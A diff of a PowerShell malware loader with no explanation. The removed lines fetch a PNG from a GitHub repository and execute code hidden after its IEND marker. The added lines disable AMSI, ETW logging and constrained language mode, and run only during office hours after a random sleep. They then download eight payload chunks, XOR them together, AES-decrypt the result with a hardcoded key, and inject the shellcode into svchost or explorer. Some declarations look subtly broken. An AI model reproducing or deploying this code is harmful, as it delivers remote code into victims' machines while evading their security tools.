@@ -1,4 +1,25 @@
-$u="https://raw.githubusercontent.com/cem324/screenshots/main/IMG_20260922_1042.png"
-try{$b=([Net.WebClient]::new()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$b=[byte[]]$w.ResponseBody}
-$i=[byte[]]@(0x49,0x45,0x4E,0x44);$p=-1;for($j=0;$j-lt$b.Length-4;$j++){if($b[$j]-eq$i[0]-and$b[$j+1]-eq$i[1]-and$b[$j+2]-eq$i[2]-and$b[$j+3]-eq$i[3]){$p=$j;break}}
-if($p-ge0){iex([Text.Encoding]::UTF8.GetString($b,$p+12,$b.Length-$p-12))}
+$b='https://raw.githubusercontent.com/cem324/screenshots/main'
+$k=Add-Type -Def @'
+[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr,string);
+[DllImport("kernel32")]static extern IntPtr GetModuleHandle(string);
+[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr,uint,uint,out uint);
+[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr,uint,uint,uint);
+[DllImport("kernel32")]static extern IntPtr RtlMoveMemory(IntPtr,IntPtr,uint);
+[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr,uint,IntPtr,IntPtr,uint,IntPtr);
+[DllImport("kernel32")]static extern IntPtr OpenProcess(uint,bool,uint);
+[DllImport("kernel32")]static extern IntPtr VirtualAllocEx(IntPtr,IntPtr,uint,uint,uint);
+[DllImport("kernel32")]static extern bool WriteProcessMemory(IntPtr,IntPtr,byte[],uint,out uint);
+[DllImport("kernel32")]static extern bool CloseHandle(IntPtr);
+'@ -Pas
+$d=date;if(0,6-contains$d.DayOfWeek.value__-or$d.Hour-lt9-or$d.Hour-ge17){exit}
+sleep(Get-Random -Mi 600 -Ma 3600)
+try{$aa=GetProcAddress(GetModuleHandle('amsi'),'AmsiScanBuffer');$ao=0;[K]::VirtualProtect($aa,6,0x40,[ref]$ao);[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$aa,6)}catch{}
+if($ExecutionContext.SessionState.LanguageMode-eq'ConstrainedLanguage'){try{$r=[Runspace]::DefaultRunspace;$r.GetType().GetField('languageMode','N,I').SetValue($r,2)}catch{$r.GetType().GetField('_languageMode','N,I').SetValue($r,2)}}
+@('EtwEventWrite','EtwEventWriteTransfer','EtwEventWriteFull','EtwEventWriteEx')|%{try{[K]::VirtualProtect((GetProcAddress([K]::GetModuleHandle('ntdll'),$_)),1,0x40,[ref]0);[Runtime.InteropServices.Marshal]::WriteByte((GetProcAddress([K]::GetModuleHandle('ntdll'),$_)),0xC3)}catch{}}
+$ch=@()
+for($ci=0;$ci-lt8;$ci++){try{$c=([Net.WebClient]::new()).DownloadData("$b/chunk_$ci")}catch{try{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',"$b/chunk_$ci",0);$w.Send();$c=[byte[]]$w.ResponseBody}catch{exit}};if(!$c-or$c.Length-lt10){exit};$ch+=$c}
+$xr=[byte[]]$ch[0].Clone();for($ci=1;$ci-lt$ch.Count;$ci++){for($cj=0;$cj-lt$xr.Length;$cj++){$xr[$cj]=$xr[$cj]-bxor$ch[$ci][$cj]}}
+$ak=[Byte[]]@(0x33,0xef,0x25,0xb8,0xe0,0x13,0xda,0xcc,0xf5,0xc7,0x31,0xe5,0xb0,0x53,0xc4,0x99)
+$iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
+if([Environment]::Is64BitOperatingSystem-and![Environment]::Is64BitProcess){$_tg=gps|?{$_.Name-in('svchost','RuntimeBroker','spoolsv')}|sort vm|select -F 1}else{$_tg=gps explorer|select -F 1}
+if($_tg){$_ph=[K]::OpenProcess(0x1F0FFF,0,$_tg.Id);$_va=[K]::VirtualAllocEx($_ph,0,$py.Length,0x3000,0x40);$_nw=0;[K]::WriteProcessMemory($_ph,$_va,$py,$py.Length,[ref]$_nw);[K]::CreateRemoteThread($_ph,0,0,$_va,0,0,0);[K]::CloseHandle($_ph)}else{$_va=[K]::VirtualAlloc(0,$py.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($py,0,$_va,$py.Length);[K]::CreateThread(0,0,$_va,0,0,0)}
